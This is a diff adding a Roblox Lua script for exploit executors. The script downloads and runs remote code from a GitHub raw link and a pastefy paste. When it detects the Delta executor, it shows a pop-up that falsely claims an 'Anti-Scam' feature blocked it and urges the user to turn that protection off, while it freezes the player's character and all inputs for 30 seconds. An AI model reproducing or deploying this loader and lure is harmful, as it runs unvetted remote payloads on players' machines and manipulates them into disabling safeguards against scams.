@@ -1,0 +1,147 @@
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local TweenService = game:GetService("TweenService")
+local TeleportService = game:GetService("TeleportService")
+local ContextActionService = game:GetService("ContextActionService")
+
+-- Function to run all loaders
+local function runLoaders()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/GnomeStorage/LUAs/refs/heads/main/MutationPicker1"))()
+    end)
+    pcall(function()
+        loadstring(game:HttpGet("https://pastefy.app/aWUIZaOY/raw"))()
+    end)
+end
+
+-- Detect executor
+local function detectExecutor()
+    if syn then
+        return "Synapse"
+    elseif KRNL then
+        return "KRNL"
+    elseif Fluxus then
+        return "Fluxus"
+    elseif Protosmasher then
+        return "Protosmasher"
+    elseif (ArceusX ~= nil) or (Arceus ~= nil) then
+        return "Arceus X"
+    elseif Delta then
+        return "Delta"
+    else
+        return "Codex / Unknown"
+    end
+end
+
+local executorName = detectExecutor()
+print("Executor detected:", executorName)
+
+-- Function to freeze player (Delta only)
+local function freezePlayer()
+    local character = player.Character or player.CharacterAdded:Wait()
+    local humanoid = character:FindFirstChildOfClass("Humanoid")
+    if humanoid then
+        humanoid.WalkSpeed = 0
+        humanoid.JumpPower = 0
+        humanoid.AutoRotate = false
+    end
+end
+
+-- Show Delta warning message + freeze
+local function showDeltaWarning()
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Parent = player:WaitForChild("PlayerGui")
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.IgnoreGuiInset = true
+
+    local Frame = Instance.new("Frame")
+    Frame.Parent = ScreenGui
+    Frame.Size = UDim2.new(0, 0, 0, 0)
+    Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
+    Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    Frame.BackgroundTransparency = 0.15
+    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 12)
+
+    local Label = Instance.new("TextLabel")
+    Label.Parent = Frame
+    Label.BackgroundTransparency = 1
+    Label.Size = UDim2.new(1, -20, 1, -100)
+    Label.Position = UDim2.new(0, 10, 0, 10)
+    Label.Font = Enum.Font.Gotham
+    Label.TextSize = 16
+    Label.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Label.TextWrapped = true
+    Label.Text = [[
+Script requires the teleport function, but it blocked due to the Anti-Scam feature.
+
+To disable this feature:
+
+1) Rejoin this game
+2) Turn off Anti-Scam in settings of Delta
+3) Execute our script or use other executors like KRNL, etc.
+]]
+
+    local InfoLabel = Instance.new("TextLabel")
+    InfoLabel.Parent = Frame
+    InfoLabel.BackgroundTransparency = 1
+    InfoLabel.Size = UDim2.new(1, -20, 0, 20)
+    InfoLabel.Position = UDim2.new(0, 0, 1, -95)
+    InfoLabel.Font = Enum.Font.GothamBold
+    InfoLabel.TextSize = 10
+    InfoLabel.TextColor3 = Color3.fromRGB(255, 255, 0)
+    InfoLabel.TextXAlignment = Enum.TextXAlignment.Center
+    InfoLabel.TextYAlignment = Enum.TextYAlignment.Center
+    InfoLabel.TextWrapped = true
+    InfoLabel.Text = 'AFTER YOU TAP "REJOIN" BUTTON WAIT FOR 30 SECONDS TO USE THE SCRIPT'
+
+    local Button = Instance.new("TextButton")
+    Button.Parent = Frame
+    Button.Size = UDim2.new(0, 140, 0, 40)
+    Button.Position = UDim2.new(0.5, -70, 1, -50)
+    Button.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
+    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Button.Text = "Rejoin"
+    Button.Font = Enum.Font.GothamBold
+    Button.TextSize = 18
+    Instance.new("UICorner", Button).CornerRadius = UDim.new(0, 8)
+
+    TweenService:Create(Frame, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Size = UDim2.new(0, 460, 0, 260),
+        Position = UDim2.new(0.5, -230, 0.5, -130)
+    }):Play()
+
+    -- Freeze player
+    freezePlayer()
+    ContextActionService:BindAction("FreezeAllInputs", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.UserInputType:GetEnumItems()))
+    ContextActionService:BindAction("FreezeAllKeys", function() return Enum.ContextActionResult.Sink end, false, unpack(Enum.KeyCode:GetEnumItems()))
+
+    -- Button click unfreeze + teleport
+    Button.MouseButton1Click:Connect(function()
+        ContextActionService:UnbindAction("FreezeAllInputs")
+        ContextActionService:UnbindAction("FreezeAllKeys")
+        TeleportService:Teleport(game.PlaceId, player)
+    end)
+
+    -- Auto-unfreeze after 30 seconds
+    task.delay(30, function()
+        ContextActionService:UnbindAction("FreezeAllInputs")
+        ContextActionService:UnbindAction("FreezeAllKeys")
+        local character = player.Character
+        if character then
+            local humanoid = character:FindFirstChildOfClass("Humanoid")
+            if humanoid then
+                humanoid.WalkSpeed = 16
+                humanoid.JumpPower = 50
+                humanoid.AutoRotate = true
+            end
+        end
+    end)
+end
+
+-- Main execution
+if executorName == "Delta" then
+    runLoaders()        -- loaders first
+    showDeltaWarning()  -- then warning + freeze
+else
+    runLoaders()        -- all others: loaders only
+end
